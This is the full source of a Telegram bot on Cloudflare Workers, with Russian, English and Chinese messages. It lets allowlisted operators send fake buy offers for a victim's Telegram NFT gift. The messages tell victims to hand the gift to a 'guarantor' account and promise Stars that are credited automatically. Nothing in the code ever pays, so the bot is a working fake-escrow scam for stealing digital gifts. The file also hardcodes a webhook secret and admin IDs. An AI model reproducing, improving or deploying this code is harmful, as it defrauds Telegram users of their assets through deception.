const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 
const RELAYER_USERNAME = "GarisOffer_Relayer"; 

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) {
      return new Response("Bot token is not configured", { status: 500 });
    }

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) {
      return new Response("Forbidden", { status: 403 });
    }

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ФУНКЦИЯ ПОДСЧЕТА ВСЕХ ПОЛЬЗОВАТЕЛЕЙ (ДЛЯ /start)
      // ==========================================
      async function getTotalUsersCount() {
          if (!kv) return 0;
          let cursor = undefined;
          let count = 0;
          try {
              do {
                  const list = await kv.list({ cursor, prefix: "user:" });
                  count += list.keys.length;
                  cursor = list.cursor;
              } while (cursor);
          } catch(e) { console.error("Ошибка подсчета:", e); }
          return count;
      }

      // ==========================================
      // КОМАНДА /stats
      // ==========================================
      if (update.message && update.message.text === "/stats") {
        const senderId = update.message.from.id;
        const chatId = update.message.chat.id;

        if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) {
            await callApi("sendMessage", { chat_id: chatId, text: "⛔ У вас нет прав на эту команду." }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        if (!kv) {
            await callApi("sendMessage", { chat_id: chatId, text: "❌ База данных KV не подключена." }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        try {
            let cursor = undefined;
            let idsList = [];
            let usernamesList = [];

            do {
                const list = await kv.list({ cursor });
                for (const key of list.keys) {
                    if (key.name.startsWith("allowed_id:")) {
                        idsList.push(key.name.replace("allowed_id:", ""));
                    }
                    if (key.name.startsWith("allowed_username:")) {
                        usernamesList.push(key.name.replace("allowed_username:", ""));
                    }
                }
                cursor = list.cursor;
            } while (cursor);

            let statsText = `📊 <b>Список доступа:</b>\n\n`;
            statsText += `👤 <b>По ID (${idsList.length}):</b>\n`;
            if (idsList.length > 0) {
                statsText += idsList.map(id => `<code>${id}</code>`).join(", ") + "\n\n";
            } else {
                statsText += `— пусто —\n\n`;
            }
            statsText += `🔗 <b>По @username (${usernamesList.length}):</b>\n`;
            if (usernamesList.length > 0) {
                statsText += usernamesList.map(uname => `@${uname}`).join(", ") + "\n\n";
            } else {
                statsText += `— пусто —\n\n`;
            }
            statsText += `👑 Главные админы: <code>${ADMIN_ID_1}</code>, <code>${ADMIN_ID_2}</code>`;
            
            await callApi("sendMessage", { chat_id: chatId, text: statsText, parse_mode: "HTML" }, BOT_TOKEN);
        } catch (err) {
            await callApi("sendMessage", { chat_id: chatId, text: `❌ Ошибка при получении статистики: ${err.message}` }, BOT_TOKEN);
        }
        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // КОМАНДЫ /add и /remove
      // ==========================================
      if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
        const senderId = update.message.from.id;
        
        if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⛔ У вас нет прав на эту команду." }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        if (!kv) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "❌ Ошибка: База данных USERS_KV не подключена в Cloudflare!" }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        const args = update.message.text.split(" ");
        const command = args[0]; 
        const targetUser = args[1]; 

        if (!targetUser) {
            await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Укажите ID или @username.", parse_mode: "HTML" }, BOT_TOKEN);
            return new Response("OK", { status: 200 });
        }

        if (command === "/remove" && targetUser.toLowerCase() === "all") {
            try {
                let cursor = undefined;
                let keysToDelete = [];
                for (let i = 0; i < 3; i++) {
                    cursor = undefined;
                    do {
                        const list = await kv.list({ cursor });
                        for (const key of list.keys) {
                            if (key.name.startsWith("allowed_")) {
                                if (key.name === `allowed_id:${ADMIN_ID_1}` || key.name === `allowed_id:${ADMIN_ID_2}`) continue;
                                if (key.name === `allowed_username:gwrex`) continue;
                                keysToDelete.push(key.name);
                            }
                        }
                        cursor = list.cursor;
                    } while (cursor);
                }
                keysToDelete = [...new Set(keysToDelete)];
                for (const key of keysToDelete) await kv.delete(key);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 <b>Список доступа очищен!</b>\nУдалено записей: ${keysToDelete.length}.`, parse_mode: "HTML" }, BOT_TOKEN);
            } catch (err) {
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `❌ Ошибка: ${err.message}` }, BOT_TOKEN);
            }
            return new Response("OK", { status: 200 });
        }

        if (command === "/add") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                await kv.put(`allowed_username:${uname}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь <b>@${uname}</b> добавлен.` , parse_mode: "HTML"}, BOT_TOKEN);
            } else {
                await kv.put(`allowed_id:${targetUser}`, "true");
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь с ID <code>${targetUser}</code> добавлен.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        } 
        else if (command === "/remove") {
            if (targetUser.startsWith("@")) {
                const uname = targetUser.slice(1).toLowerCase();
                await kv.delete(`allowed_username:${uname}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь <b>@${uname}</b> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            } else {
                await kv.delete(`allowed_id:${targetUser}`);
                await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 Пользователь с ID <code>${targetUser}</code> удален.`, parse_mode: "HTML" }, BOT_TOKEN);
            }
        }
        return new Response("OK", { status: 200 });
      }

      // ==========================================
      // ПРОВЕРКА ДОСТУПА
      // ==========================================
      async function checkAccess(userId, username) {
          if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return true; 
          if (!kv) return false; 
          const byId = await kv.get(`allowed_id:${userId}`);
          if (byId) return true;
          if (username) {
              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
              if (byName) return true;
          }
          return false;
      }

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (kv) await kv.put(`user:${userId}`, username || "no_username");
        const totalUsers = await getTotalUsersCount();

        // УБРАН КОНВЕРТ, ДОБАВЛЕНА ССЫЛКА НА ГАРАНТА
        const startText = `👥 <b>Всего пользователей в боте:</b> ${totalUsers}\n\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.\n4. Звезды хранятся в боте и автоматически придут вам после передачи подарка.\n\n⏳ Ограниченное время на подтверждение.`;
        
        const startMarkup = {
          inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
        };

        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
      }

      // --- INLINE ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username || "";

        if (kv) await kv.put(`user:${userId}`, username || "no_username");
        const hasAccess = await checkAccess(userId, username);
        if (!hasAccess) return new Response("OK", { status: 200 });

        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        let lang = "ru";
        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); }
        else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }

        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "";
        if (giftMatch) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";
        if (textQuery.includes("gram") || textQuery.includes("ton")) { currencyType = "gram"; currencyDisplay = "💎 Gram"; } 
        else if (textQuery.includes("rub") || textQuery.includes("руб")) { currencyType = "rub"; currencyDisplay = "₽ Rub"; }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
        
        // УБРАН КОНВЕРТ И ЭМОДЗИ ПОДАРКА, ДОБАВЛЕНА ССЫЛКА НА ГАРАНТА
        let text = "";
        let btnAccept = "Принять";
        let btnDecline = "Отклонить";
        let titleText = "";

        if (lang === "en") {
            text = `<b>Offer for your gift</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}\n\nTo receive payment, send the gift to the guarantor <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.`;
            btnAccept = "Accept";
            btnDecline = "Decline";
            titleText = `Offer: ${amount} ${currencyDisplay}`;
        } else if (lang === "cn") {
            text = `<b>针对您礼物的报价</b>\n\n有人为您提供 <b>${amount} ${currencyDisplay}</b>\n${giftLink}\n\n要获得付款，请将礼物发送给担保人 <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>。`;
            btnAccept = "接受";
            btnDecline = "拒绝";
            titleText = `报价: ${amount} ${currencyDisplay}`;
        } else {
            text = `<b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}\n\nЧтобы получить оплату, передайте подарок гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.`;
            btnAccept = "Принять";
            btnDecline = "Отклонить";
            titleText = `Оффер: ${amount} ${currencyDisplay}`;
        }

        const offerId = Math.random().toString(36).substring(2, 10);
        if (kv) {
            await kv.put(`offer:${offerId}`, JSON.stringify({ amount, currencyType, giftLink, lang, senderName }), { expirationTtl: 86400 });
        }

        const results = [{
          type: "article", id: "1",
          title: titleText,
          description: `${amount} ${currencyDisplay}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: { inline_keyboard: [
              [{ text: btnAccept, callback_data: `acc|${offerId}` }],
              [{ text: btnDecline, callback_data: `dec|${offerId}` }]
          ] }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data === "how_to_accept") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
          const instructionText = `🎁 <b>Пошаговая инструкция:</b>\n\n<b>Шаг 1.</b> Нажмите «Принять».\n\n<b>Шаг 2.</b> Нажмите «Передать подарок».\n\n<b>Шаг 3.</b> Отправьте подарок гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a> (ОБЯЗАТЕЛЬНО).\n\n<b>Шаг 4.</b> Дождитесь проверки. Звезды придут автоматически.`;
          const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
          try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
        }

        if (cq.data === "back_to_start") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
          const userId = cq.from.id;
          const totalUsers = await getTotalUsersCount();
          const startText = `👥 <b>Всего пользователей в боте:</b> ${totalUsers}\n\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.\n4. Звезды хранятся в боте и автоматически придут вам после передачи подарка.`;
          const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
          try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); } catch (e) {}
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const offerId = dataParts[1];
          
          if (!offerId) return new Response("OK", { status: 200 });

          let offer = { amount: "0", currencyType: "stars", giftLink: "", lang: "ru", senderName: "" };
          if (kv) {
              const saved = await kv.get(`offer:${offerId}`);
              if (saved) offer = JSON.parse(saved);
          }

          const amount = offer.amount;
          const currencyType = offer.currencyType;
          const lang = offer.lang;
          
          let displayCurrency = "⭐ Stars";
          if (currencyType === "gram") displayCurrency = "💎 Gram";
          if (currencyType === "rub") displayCurrency = "₽ Rub";

          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: lang === "en" ? `Offer accepted ✅\n\nSend gift to @${RELAYER_USERNAME}` : `Оффер принят ✅\n\nПередайте подарок гаранту @${RELAYER_USERNAME}`, show_alert: true }, BOT_TOKEN);
            
            // ССЫЛКА НА ГАРАНТА В КНОПКЕ
            const finalUrl = "https://t.me/" + RELAYER_USERNAME;

            if (lang === "en") {
                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\n${amount} ${displayCurrency} will be credited after the gift is transferred to <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.`;
                newMarkup = { inline_keyboard: [[{ text: "Send Gift to Guarantor", url: finalUrl }]] };
            } else if (lang === "cn") {
                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n${amount} ${displayCurrency} 将在礼物转移给 <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a> 后记入。`;
                newMarkup = { inline_keyboard: [[{ text: "发送礼物给担保人", url: finalUrl }]] };
            } else {
                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\n${amount} ${displayCurrency} будут зачислены после того, как подарок будет передан гаранту <a href="https://t.me/${RELAYER_USERNAME}">@${RELAYER_USERNAME}</a>.`;
                newMarkup = { inline_keyboard: [[{ text: "Передать подарок гаранту", url: finalUrl }]] };
            }
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            newText = lang === "en" ? `❌ <b>You declined the offer.</b>` : `❌ <b>Вы отказались от оффера.</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            const chatId = cq.message.chat.id;
            const messageId = cq.message.message_id;
            try {
              await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }, BOT_TOKEN); } catch (e) {}
            } catch (err) {}
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}